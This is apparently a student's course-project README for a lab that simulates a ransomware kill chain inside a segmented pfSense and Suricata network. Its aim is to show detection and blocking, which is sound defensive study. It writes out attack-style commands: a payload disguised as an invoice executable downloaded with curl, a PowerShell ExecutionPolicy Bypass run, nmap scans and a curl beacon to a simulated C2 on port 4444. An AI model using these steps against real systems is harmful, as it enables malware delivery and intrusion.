# Advanced Network Security Project  
## Ransomware Kill Chain Simulation in a Zero-Trust Segmented Network

**Author:** Nagesh Goud Karinga  
**Course:** Advanced Network Security  
**Platform:** Proxmox, pfSense, Suricata, Kali Linux, Windows 10, Ubuntu (DMZ)  
**Instructor:** Dr. Ali Zarafshani  

#  Project Overview

This project implements a complete **Zero-Trust enterprise network** and simulates the **full ransomware kill chain**, from delivery to command-and-control (C2).  
The goal is to demonstrate how layered network security—firewalls, segmentation, IDS/IPS, and access control—can **prevent, detect, and contain** ransomware attacks.

The environment was built entirely on a **Proxmox virtualization server**, and includes:

- pfSense Firewall + VPN  
- LAN segmented network (10.10.10.0/24)  
- DMZ segmented network (10.10.20.0/24)  
- Suricata IDS/IPS in inline mode  
- Kali Linux attacker machine  
- Windows 10 victim endpoint  
- Ubuntu DMZ malicious server  
- Simulated ransomware execution  
- Nmap lateral movement testing  
- C2 beacon blocking  

This repository contains **all required Step-3 source files**, including scripts, IDS rules, pfSense config, and Nmap outputs.

#  Repository Structure

advanced-network-security-project/
│
├── README.md
├── network_diagram.png # Full project topology
│
├── dmz_server_commands.txt # Commands used on DMZ malicious server
├── malicious_payload_placeholder.txt # Dummy payload placeholder
│
├── local.rules # Suricata custom rule file
├── suricata_exported_rules.conf # Exported rule configuration (pfSense)
│
├── lan_scan.txt # Nmap results for LAN
├── dmz_scan.txt # Nmap results for DMZ
├── dmz_service_scan.txt # Service scan for DMZ host
│
├── simulate_ransomware.ps1 # Ransomware simulation script
├── powershell_execution_commands.txt # PowerShell commands used
│
└── c2_test_commands.txt # C2 simulation command set


#  Network Architecture
The network follows a **Zero Trust** model:

### **1. WAN**
- Connects pfSense to the external internet.

### **2. LAN (10.10.10.0/24)**
- Windows 10 victim machine  
- Kali attacker machine  
- Suricata monitors LAN interface (em1)

### **3. DMZ (10.10.20.0/24)**
- Ubuntu server hosting malicious payload  
- Suricata monitors DMZ interface (em2)  

### **4. pfSense Firewall**
- Enforces segmentation  
- Controls all traffic flows  
- Hosts OpenVPN  
- Runs Suricata IDS/IPS

The diagram (`network_diagram.png`) visually maps this setup.

#  Kill Chain Simulation Breakdown

## **1. Delivery — Malicious Payload Hosting**
Ubuntu DMZ server runs:
python3 -m http.server 8080
A fake ransomware payload (`invoice_update.exe`) is placed in the server directory.
Windows victim downloads it:
curl http://10.10.20.10:8080/invoice_update.exe
 -O malware.exe

**Suricata detects EXE download** via custom rule in `local.rules`.

## **2. Execution — Ransomware Behavior**
A safe ransomware simulation script was executed on Windows:
powershell -ExecutionPolicy Bypass -File simulate_ransomware.ps1

Effects demonstrated:
- File encryption (simulated renaming)  
- Creation of a ransom note  
- Suricata logs PowerShell and file interaction events

## **3. Lateral Movement — Nmap Reconnaissance**
Using the Kali attacker:

### LAN scan:
nmap -sS 10.10.10.0/24
### DMZ scan:
nmap -sS 10.10.20.0/24

### DMZ service enumeration:
nmap -sV 10.10.20.10


**Results:**  
- Only port 8080 reachable in DMZ  
- DMZ → LAN fully blocked by firewall  
- Suricata logs SYN scan activity  

Outputs stored in:  
- `lan_scan.txt`  
- `dmz_scan.txt`  
- `dmz_service_scan.txt`  

## **4. Command & Control (C2) Simulation**
Windows attempts to contact a fake C2 server:

curl http://10.10.10.101:4444/beacon


Firewall blocks the attempt.  
Suricata triggers an alert from “Emerging Threats C2/Botnet” category.

Commands saved in:
- `c2_test_commands.txt`

# 🛡️ Security Controls Implemented

### ✔ Network Segmentation
LAN and DMZ are completely isolated.

### ✔ pfSense Access Control
- DMZ cannot initiate connections to LAN  
- LAN can reach only approved ports  
- All outbound C2 ports blocked  
- Internet access controlled  

### Suricata IDS/IPS
- Inline mode on LAN and DMZ  
- Enabled rule sets:
  - Malware  
  - Attack Kit  
  - C2/Exfiltration  
  - Scan/Recon  
  - Phishing  
  - File transfer  
- Custom rule to detect EXE downloads  

###  OpenVPN Remote Access
Provides secure access to the internal environment.

#  Completed Deliverables

- Full Zero Trust design implemented  
- All network components configured  
- Kill-chain simulation executed successfully  
- Suricata alerts generated for:
  - Malware delivery  
  - Network scanning  
  - C2 beacon  
- Logs captured and saved  
- Screenshots included in PDF report  
- Source files included in this repository  
- Presentation script and slides prepared  
